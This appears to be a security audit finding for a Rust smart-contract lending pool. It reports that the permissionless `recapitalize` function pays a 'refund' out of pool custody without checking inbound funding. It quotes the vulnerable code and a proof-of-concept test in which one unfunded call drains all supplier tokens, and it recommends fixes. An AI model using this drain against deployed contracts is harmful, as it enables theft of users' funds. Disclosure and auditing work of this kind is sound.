### Title
`Pool::recapitalize` pays the "excess refund" out of pool custody without verifying any inbound funding — unprivileged drain of supplier tokens - (File: contracts/pool/src/ops/recapitalize.rs)

### Summary

CVE-2016-10060's class is "a write is assumed to have happened; its return value is never checked, so downstream logic proceeds on phantom work." `recapitalize` in the pool is that shape exactly: the function assumes the controller has already transferred `amount` tokens into the pool ("The controller transfers `amount` into the pool before this call"), but the pool itself never verifies that any tokens arrived. It books `min(amount, backing_shortfall)` into cash and pays `amount - applied` back to `payer` from the pool's own custody. Called directly on the pool — it is a permissionless entrypoint — with no prefunding at all, the "refund" is paid out of suppliers' tokens.

### Finding Description

`contracts/pool/src/ops/recapitalize.rs`:

```rust
let applied = amount.min(guards::backing_shortfall(&cache));
let refund = amount.checked_sub(applied)...;
cache.credit_cash(applied);
cache.commit();
...
outcome.cache.transfer_out(&payer, outcome.refund);   // line 34
```

Two failures of the "unchecked write" class:

1. **Unverified inbound funding.** The pool credits `applied` to `cash` purely on the word of the call arguments — there is no `balance`/`balance_delta` check that `applied` (or anything) was actually transferred in. Compare `contracts/controller/src/markets.rs:154-163`, where the controller correctly does `transfer_amount_measured` before calling `pool_recapitalize_call`. The pool op trusts that the controller was the only caller; nothing in `apply`/`accounting` enforces the prefunding precondition.

2. **Refund paid from custody, not from the just-received funds.** `transfer_out(&payer, refund)` (`contracts/pool/src/cache/cash.rs:46-53`) sends pool-held tokens to `payer` and does not even check the cash book. When `amount > backing_shortfall`, the excess is paid out of existing supplier custody.

`contracts/pool/tests/flows.rs:3408` (`test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody`) proves this end-to-end: a `recapitalize` call with **zero** inbound transfer drains the entire pool balance into `payer` and leaves `cash` still claiming ≥ the supplier's deposit, after which the supplier's `withdraw` passes the pool's own `require_reserves`/`PoolInsolvent` guards and fails inside the SAC transfer (`BalanceError = 10`) — i.e., the book reports solvency that no longer exists.

### Impact Explanation

Unprivileged theft of user funds, and latent insolvency:

- **Direct drain:** attacker calls `pool.recapitalize(hub_asset, attacker, N)` on any listed market with `N > backing_shortfall` (in the worst case `backing_shortfall = 0`, so `applied = 0` and the full `N` becomes `refund`). `N` tokens are transferred from pool custody to the attacker with zero tokens deposited.
- **Permanent book/custody divergence:** any nonzero `applied` inflates `cash` without backing, so the market reports itself solvent while underfunded; later withdrawals revert inside the token transfer (fail at custody, not at pool guards), freezing suppliers' funds.

### Likelihood Explanation

- `recapitalize` is a permissionless pool entrypoint (listed in `scripts/permissionless_entrypoints.txt`; the in-repo test calls it directly with no auth and it succeeds).
- Requires no capital, no existing position, and no privileged role — a single call with a generated `payer` address.
- Every listed market is exposed; the attacker can repeat per `(hub, token)` until custody is exhausted.

### Recommendation

Measure the inbound funding inside the pool, exactly as `supply`/`repay` and the controller-side wrapper do:

- In `ops::recapitalize::apply` (or before `accounting`), snapshot `token.balance(pool)` or have the pool perform the pull itself via `transfer_amount_measured`, and compute `applied`/`refund` against the *measured* receipt, not the declared `amount`.
- Alternatively, authenticate the caller as the controller (`controller.require_auth()` / an operator check) so the prefunding precondition is actually guaranteed, and document that assumption.
- Additionally, gate `transfer_out` on `require_reserves` so a refund can never exceed accounted cash.

### Proof of Concept

From the existing test `contracts/pool/tests/flows.rs:3408`:

```rust
let t = TestSetup::new();
let token = token::Client::new(&t.env, &t.asset);
let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
let payer = Address::generate(&t.env);      // attacker, zero balance, no auth needed

token_admin.mint(&t.pool, &10_000_000_000); // simulate supplier custody
// ... a supplier deposits via the controller ...

let custody = token.balance(&t.pool);
// No transfer into the pool happens at all:
t.client().recapitalize(&hub(&t.asset), &payer, &custody);

assert_eq!(token.balance(&t.pool), 0);          // custody gone
assert_eq!(token.balance(&payer), custody);     // attacker holds suppliers' tokens
assert!(t.state_snapshot().cash > 0);           // book still claims solvency
```

With `backing_shortfall == 0` the entire `amount` is classified as `refund` and paid from pool custody; with a nonzero shortfall the attacker gets `amount - shortfall` for free *and* the cash book is overstated by `shortfall`, guaranteeing later withdrawals revert inside the SAC transfer. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** contracts/pool/src/ops/recapitalize.rs (L26-58)
```rust
pub(crate) fn apply(
    env: &Env,
    hub_asset: HubAssetKey,
    payer: Address,
    amount: i128,
) -> PoolAmountMutation {
    let outcome = accounting(env, hub_asset, amount);

    outcome.cache.transfer_out(&payer, outcome.refund);

    events::emit_market_state(env, outcome.cache.snapshot());
    outcome.mutation
}

/// Sizes and books the cash injection without transferring tokens.
///
/// Credits `min(amount, backing_shortfall)` to cash and commits. `refund` is
/// `amount - applied`.
pub(crate) fn accounting(
    env: &Env,
    hub_asset: HubAssetKey,
    amount: i128,
) -> RecapitalizationOutcome {
    require_nonneg_amount(env, amount);
    let mut cache = ops::renewed_market(env, &hub_asset);

    let applied = amount.min(guards::backing_shortfall(&cache));
    let refund = amount
        .checked_sub(applied)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));

    cache.credit_cash(applied);
    cache.commit();
```

**File:** contracts/pool/src/cache/cash.rs (L43-53)
```rust
    /// Transfers `amount` of the market asset from the pool to `recipient`.
    ///
    /// Rejects negative amounts; zero is a no-op. Does not adjust accounting cash.
    pub(crate) fn transfer_out(&self, recipient: &Address, amount: i128) {
        require_nonneg_amount(&self.env, amount);
        if amount == 0 {
            return;
        }
        let tok = token::Client::new(&self.env, &self.params.asset_id);
        tok.transfer(&self.env.current_contract_address(), recipient, &amount);
    }
```

**File:** contracts/controller/src/markets.rs (L142-164)
```rust
pub(crate) fn recapitalize(
    env: &Env,
    payer: Address,
    hub_asset: HubAssetKey,
    amount: i128,
) -> i128 {
    validation::require_authorized_caller(env, &payer);
    require_positive_amount(env, amount);

    let mut cache = Context::new(env);
    let pool_addr = cache.cached_pool_address();
    // Prefund the pool and credit only its measured receipt.
    let received = payments::transfer_amount_measured(
        env,
        &hub_asset.asset,
        &payer,
        &pool_addr,
        amount,
        GenericError::AmountMustBePositive,
    );

    pool_recapitalize_call(env, &pool_addr, &hub_asset, &payer, received).actual_amount
}
```

**File:** contracts/pool/tests/flows.rs (L3408-3483)
```rust
fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );

    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
    // reports insufficient balance as its own contract error `BalanceError = 10`.
    // The asserts check that exact code and that neither pool liquidity guard
    // fired: `require_reserves` read the book and let the exit through.
    const SAC_BALANCE_ERROR: u32 = 10;
    match outcome {
        Err(Ok(err)) => {
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::InsufficientLiquidity as u32),
                "the pool's own liquidity guard must NOT be what stopped this -- \
                 it reads the cash book, which still shows the funds"
            );
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::PoolInsolvent as u32),
                "the pool's solvency guard must NOT be what stopped this either"
            );
            assert_eq!(
                err,
                Error::from_contract_error(SAC_BALANCE_ERROR),
                "the exit must fail inside the SAC transfer for want of custody"
            );
        }
        Err(Err(host_abort)) => panic!("expected a SAC contract error, got {host_abort:?}"),
        Ok(_) => unreachable!("asserted is_err above"),
    }
    assert_eq!(token.balance(&receiver), 0, "the supplier received nothing");
    assert_eq!(
        t.state_snapshot().cash,
        book,
        "the failed exit rolled back, so the book still overstates custody"
    );
}
```
